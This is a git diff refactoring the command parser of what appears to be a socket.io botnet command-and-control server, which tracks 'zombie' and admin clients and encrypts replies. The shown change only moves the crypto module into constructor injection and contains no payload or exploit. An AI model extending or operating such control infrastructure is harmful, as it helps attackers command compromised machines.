@@ -1,6 +1,7 @@
 import { DefaultEventsMap, Server, Socket } from "socket.io";
-import { VeparServer, cryptoModule } from "..";
+import { VeparServer } from "..";
 import { single_zombie_commands, all_zombie_commands } from "../constants/commands";
+import CryptoModule from "../crypto/CryptoModule";
 
 type Command = {
   aliases: string[];
@@ -15,6 +16,7 @@ export default class CommandParser {
   private cmd: string[] = [];
   private io: Server<DefaultEventsMap, DefaultEventsMap, DefaultEventsMap, any>;
   private admin: boolean = false;
+  private cryptoModule: CryptoModule;
 
   /**
    * Command Parser Constructor
@@ -27,11 +29,13 @@ export default class CommandParser {
     io: Server<DefaultEventsMap, DefaultEventsMap, DefaultEventsMap, any>,
     command: string[],
     private socket: Socket,
-    admin: boolean
+    admin: boolean,
+    cryptoModule: CryptoModule
   ) {
     this.cmd = command;
     this.io = io;
     this.admin = admin;
+    this.cryptoModule = cryptoModule;
 
     const commands: Command[] = [
       {
@@ -85,7 +89,7 @@ export default class CommandParser {
       return `${clientSocket.id} (${ip}) ${ip.includes(process.env.DASHBOARD_IP as string) ? '[ADMIN]' : '[ZOMBIE]'}`;
     });
 
-    socket.emit("message", cryptoModule.encrypt(clients.length === 0 ? "No clients connected." : `Connected clients: \n - ${clients.join("\n - ")}`));
+    socket.emit("message", this.cryptoModule.encrypt(clients.length === 0 ? "No clients connected." : `Connected clients: \n - ${clients.join("\n - ")}`));
   }
 
   /**
